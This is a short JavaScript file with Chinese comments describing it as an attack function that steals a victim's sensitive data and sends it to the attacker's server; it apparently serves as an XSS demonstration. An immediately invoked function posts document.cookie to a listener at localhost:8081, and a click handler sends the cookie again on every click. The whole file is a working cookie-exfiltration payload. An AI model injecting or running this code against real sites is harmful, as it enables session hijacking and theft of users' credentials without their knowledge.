/**
 * 编写攻击函数
 * 实质就是获取被攻击者的一些敏感数据，发送给攻击者的服务器
 * 匿名函数立即执行
 */
;(function () {
    console.info("start attack...");
    // 为方便直接使用jquery方法
    $.ajax({
        url: "http://localhost:8081/listener/log",
        type: "POST",
        dataType: "json",
        data: JSON.stringify({data: document.cookie}),
        processData: false,
        contentType: "application/json",
        success: function (arg) {
            console.log(arg);
            console.log("监听到数据");
        }
    });
})();

document.onclick = function (evt) {
    evt = evt || window.event
    key = String.fromCharCode(evt.charCode)
    if (key) {
        var http = new XMLHttpRequest();
        var param = encodeURI(key);
        http.open("POST", "http://localhost:8081/listener/log", true);
        http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        http.send("data=" + document.cookie);
    }
}